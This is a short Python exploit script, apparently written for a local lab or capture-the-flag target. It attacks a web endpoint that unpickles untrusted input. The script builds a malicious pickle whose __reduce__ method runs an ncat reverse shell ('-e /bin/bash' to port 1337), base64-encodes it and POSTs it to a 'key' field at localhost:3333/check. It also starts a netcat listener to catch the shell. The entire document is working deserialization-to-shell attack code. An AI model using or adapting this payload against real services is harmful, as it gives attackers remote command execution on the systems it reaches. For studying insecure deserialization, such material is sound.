import requests, pickle as cPickle, base64
import os, _thread, time

class GetShell(object):
	def __reduce__(self):
		return (os.system, ("ncat 127.0.0.1 1337 -e /bin/bash",))

def send_hack(delay=1):
	time.sleep(delay) if not delay is None else None
	hackstring = base64.b64encode(cPickle.dumps(GetShell()))
	r = requests.post("http://localhost:3333/check",
		data={'key':hackstring.decode()})
	print("we gottem" if r.content.decode() == "none" else "mission failed, we'll gettem next time")
def start_listener():
	os.system("nc -lvp 1337")

def main():
	_thread.start_new_thread(send_hack, ())
	start_listener()
main() if __name__ == "__main__" else None
